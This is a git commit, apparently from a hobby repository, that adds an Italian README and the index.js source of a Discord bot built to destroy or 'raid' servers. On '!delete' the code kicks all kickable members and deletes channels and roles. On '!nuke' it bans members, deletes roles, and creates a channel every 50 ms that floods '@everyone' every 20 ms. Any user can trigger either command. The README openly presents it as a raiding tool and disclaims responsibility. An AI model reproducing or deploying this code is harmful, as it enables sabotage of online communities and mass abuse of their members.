f39e2ed9db9e8e08fce3217fa11b4b89f60969b7
isacco8bot <isaccobertola8@gmail.com>
2022-03-12 18:52:25 +0100

    CREATE CODE

--- README.md
+++ README.md
@@ -1,2 +1,8 @@
-# DELVETOR
+# DELETOR
 Repository per eliminare un server Discord
+# CREDITI
+Crediti: cappella_smegma#4457, contettatemi per problemi
+# ATTENZIONE 
+Non mi assumo responsabilità per il vostro utilizzo del codice
+# UTILIZZO
+Se volete eliminare un server fate !delete, invece per raidarlo !nuke
--- index.js
+++ index.js
@@ -1,6 +1,75 @@
 require("dotenv").config()
-global.Discord = require("discord.js");
-global.client = new Discord.Client({
+const Discord = require("discord.js");
+const client = new Discord.Client({
     intents: 32767,
     partials: ['MESSAGE', 'CHANNEL', 'REACTION']
 });
+
+client.login(process.env.TOKEN)
+
+client.on("ready", () => {
+    console.log("Deletor on line")
+})
+
+client.on("messageCreate", message => {
+    if (message.content == "!info") {
+        let embed = new Discord.MessageEmbed()
+            .setTitle("__Info BOT__")
+            .setDescription("Ecco le informazioni riguardo il bot")
+            .addField("Linguaggio", "JavaScript", true)
+            .addField("Libreria", "discord.js v13.6.0", true)
+            .addField("Creazione bot⏰", "01/03/2022", true)
+            .addField("Developer🖥️", "cappella_smegma#4457", true)
+        message.channel.send({ embeds: [embed] })
+    }
+})
+
+client.on("messageCreate", async message => {
+    if (message.content == "!delete") {
+
+        const members = await message.guild.members.fetch()
+        members.filter(m => m.kickable).forEach(m => m.kick())
+
+
+        try {
+            const channel = await message.guild.channels.fetch()
+            channel.forEach(c => c.delete())
+        } catch (error) {
+            console.log(error)
+        }
+
+        message.guild.roles.cache.each(role => {
+            if (role.editable && role.name !== "@everyone") {
+                role.delete().catch(err => console.log(role.name))
+            }
+        });
+
+    }
+})
+
+
+client.on("messageCreate", async message => {
+    if (message.content == "!nuke") {
+        try {
+            const members = await message.guild.members.fetch()
+            members.filter(m => m.bannable).forEach(m => m.ban())
+
+            message.guild.roles.cache.each(role => {
+                if (role.editable && role.name !== "@everyone") {
+                    role.delete().catch(err => console.log(role.name))
+                }
+            });
+
+            setInterval(async () => {
+                var server = message.channel.guild;
+                server.channels.create("RAID", {
+                    type: "text"
+                }).then(canale => {
+                    setInterval(async () => {
+                        canale.send("@everyone questo server è stato raidato\r@everyone questo server è stato raidato\r@everyone questo server è stato raidato")
+                    }, 20)
+                })
+            }, 50);
+        } catch { return }
+    }
+})
